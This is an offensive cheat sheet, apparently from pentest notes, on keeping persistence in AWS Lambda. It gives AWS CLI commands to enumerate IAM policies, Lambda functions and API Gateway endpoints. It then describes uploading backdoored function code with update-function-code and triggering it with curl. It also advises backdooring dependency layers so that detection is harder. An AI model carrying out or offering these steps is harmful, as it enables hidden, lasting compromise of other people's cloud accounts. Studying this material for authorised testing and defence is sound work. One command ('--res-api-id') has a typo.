# AWS Lambda and API Gateway Persistence

### If the user has sufficient rights in the lambda function, its possible to download the source code, add a backdoor to it and upload. Everytime the lambda executes, the malicious code will also execute.

### Always try to update the code of layers (depedencies) instead of the actual lambda code, this way our backdoor will be difficult to detect.

 - aws sts get-caller-identity (Checking which user is executing)

 - aws iam list-attached-user-policies --user-name USER_NAME (Checking all managed policies attached to the user)

 - aws iam get-policy-version --policy-arn ARN --version-id ID (Checking information about a specific policy)

 - aws lambda list-functions --region REGION (Listing all lambda functions)

 - aws lambda get-function --function-name NAME (Listing information about the specified lambda)

### Download and analyze the code, then:

 - aws lambda get-policy --function-name NAME --profile PROFILE --region REGION

### We can grab informations like id, who can invoke and other details with this command (Helps to build the query to execute the lambda function).

 - aws apigateway get-rest-apis (Listing Rest API'S)

 - aws apigateway get-rest-api --rest-api-id ID (Listing information about a specific API)

 - aws apigateway get-resources --rest-api-id ID (Listing information about endpoints)

 - aws apigateway get-resource --rest-api-id ID --resource-id ID (Listing information about a specific endpoint)

 - aws apigateway get-method --rest-api-id ApiID --resource-id ID --http-method METHOD (Listing method information for the endpoint) (Test various methods to see if the API supports it)

 - aws apigateway get-stages --rest-api-id ID (List all versions of a rest API)

 - aws apigateway get-stage --res-api-id ID --stage-name NAME (Getting information about a specific version)

## Uploading the backdoor code to aws lambda function

 - aws lambda update-function-code --function-name FUNCTION --zip-file fileb://my-function/EXAMPLE 

## Invoke the function

 - curl https://uj3948ie.execute-api.us-east-2.amazonaws.com/default/EXAMPLE

### Where:

#### 1. API-ID -> uj3948ie

#### 2. Region -> us-east-2

#### 3. Resource (Endpoint) -> EXAMPLE

#### 4. Method -> Get

#### 5. Stage (Version) -> default

#### 6. API-Key -> None

### All these details are tgathered during enumeration
